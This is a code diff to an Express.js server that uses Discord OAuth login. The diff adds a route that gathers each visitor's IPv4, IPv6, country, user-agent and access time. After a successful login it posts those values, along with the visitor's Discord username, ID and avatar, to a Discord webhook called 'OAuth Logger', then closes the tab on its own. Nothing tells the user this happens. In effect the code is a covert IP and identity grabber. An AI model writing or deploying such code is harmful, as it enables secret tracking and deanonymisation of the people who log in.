@@ -1,5 +1,6 @@
 require('dotenv').config();
 const express = require('express');
+const path = require('path');
 const session = require('express-session');
 const passport = require('passport');
 const DiscordStrategy = require('passport-discord').Strategy;
@@ -16,16 +17,16 @@ const {
 
 const app = express();
 
-// セッション設定
-app.use(
-  session({
-    secret: SESSION_SECRET,
-    resave: false,
-    saveUninitialized: false
-  })
-);
+// --- Session & Passport setup ---
+app.use(session({
+  secret: SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false
+}));
 
-// OAuthスコープ "email" を含める
+app.use(passport.initialize());
+app.use(passport.session());
+
 passport.use(
   new DiscordStrategy(
     {
@@ -35,7 +36,7 @@ passport.use(
       scope: ['identify', 'email']
     },
     async (accessToken, refreshToken, profile, done) => {
-      // プロフィールをセッションに保存
+      // The user’s Discord profile is passed here
       return done(null, profile);
     }
   )
@@ -48,42 +49,80 @@ passport.deserializeUser((obj, done) => {
   done(null, obj);
 });
 
-app.use(passport.initialize());
-app.use(passport.session());
+// --- Serve the static front-end from the "public" folder ---
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
 
-// トップページ
-app.get('/', (req, res) => {
-  res.send(`
-    <h1>Discord OAuth Example</h1>
-    <p><a href="/auth/discord">Login with Discord</a></p>
-  `);
+// ------------- Routes -------------
+// Home (login) page is served by index.html in "public"
+
+// POST /userinfo: store client-side IP & geolocation data in session
+app.post('/userinfo', (req, res) => {
+  req.session.userInfo = req.body; // Save IP, IPv6, country, browser, etc.
+  return res.json({ status: 'ok' });
 });
 
-// Discordへのリダイレクト
+// Discord OAuth start
 app.get('/auth/discord', passport.authenticate('discord'));
 
-// コールバックURL
+// Discord OAuth callback
 app.get(
   '/auth/discord/callback',
   passport.authenticate('discord', { failureRedirect: '/' }),
   async (req, res) => {
-    // 認証成功
-    const { email, username, discriminator, id } = req.user;
-    // Webhookに送る埋め込み例
-    const embed = {
+    // If authentication succeeds, we have:
+    // req.user -> Discord profile
+    // req.session.userInfo -> IP/geo info from client
+    const { userInfo } = req.session || {};
+    const userAgent = userInfo?.browser || 'Unknown';
+    const ip = userInfo?.ipv4 || 'Unknown';
+    const ip6 = userInfo?.ipv6 || 'Unknown';
+    const country = userInfo?.country || 'Unknown';
+    const accessedAt = userInfo?.accessedAt || new Date().toLocaleString();
+
+    const { username, discriminator, id, avatar } = req.user || {};
+    const avatarURL = avatar
+      ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
+      : 'https://cdn.discordapp.com/embed/avatars/0.png'; // Default avatar if none
+
+    // Prepare embed
+    const embedData = {
+      username: 'OAuth Logger',
       embeds: [
         {
           title: 'New OAuth Login',
           description: `A user just logged in via Discord!`,
           color: 3447003,
+          thumbnail: { url: avatarURL },
           fields: [
             {
-              name: 'Username',
+              name: 'User',
               value: `${username}#${discriminator} (ID: ${id})`
             },
             {
-              name: 'Email',
-              value: email || 'No email shared.'
+              name: 'IPv4',
+              value: ip,
+              inline: false
+            },
+            {
+              name: 'IPv6',
+              value: ip6,
+              inline: false
+            },
+            {
+              name: 'Country',
+              value: country,
+              inline: false
+            },
+            {
+              name: 'Browser / User-Agent',
+              value: userAgent,
+              inline: false
+            },
+            {
+              name: 'Accessed At',
+              value: accessedAt,
+              inline: false
             }
           ]
         }
@@ -94,17 +133,45 @@ app.get(
       await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(embed)
+        body: JSON.stringify(embedData)
       });
-      console.log('Webhook successfully sent!');
+      console.log('Webhook sent successfully!');
     } catch (err) {
       console.error('Error sending webhook:', err);
     }
 
-    res.send('<h2>Discord Authentication Successful</h2>');
+    // Clear session userInfo if desired
+    req.session.userInfo = null;
+
+    // Redirect to a page that automatically closes the tab
+    return res.redirect('/close-tab');
   }
 );
 
-app.listen(PORT || 3000, () => {
-  console.log(`Server started on port ${PORT || 3000}`);
+// A page that closes the tab automatically
+app.get('/close-tab', (req, res) => {
+  // Basic HTML + JS that closes the tab
+  res.send(`
+    <html>
+      <head>
+        <meta charset="UTF-8"/>
+        <title>Auth Success</title>
+      </head>
+      <body style="background: #f0f0f0; text-align: center; padding-top: 40px;">
+        <h2>認証成功</h2>
+        <p>このタブは自動的に閉じられます。</p>
+        <script>
+          // Attempt to close the window/tab after a slight delay
+          setTimeout(() => {
+            window.close();
+          }, 2000);
+        </script>
+      </body>
+    </html>
+  `);
+});
+
+// Start the server
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
 });
